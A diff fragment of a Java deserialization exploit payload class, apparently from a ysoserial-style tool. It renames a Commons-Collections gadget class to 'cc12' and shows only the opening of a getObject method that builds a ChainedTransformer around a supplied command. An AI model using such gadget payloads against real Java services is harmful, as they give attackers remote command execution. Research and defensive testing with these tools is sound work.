@@ -18,7 +18,7 @@ import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 @Authors({Authors.Jayl1n})
-public class CommonsCollections12 implements ObjectPayload<Object>{
+public class cc12 implements ObjectPayload<Object>{
     @Override
     public Object getObject(String command) throws Exception {
         final Transformer transformerChain = new ChainedTransformer(
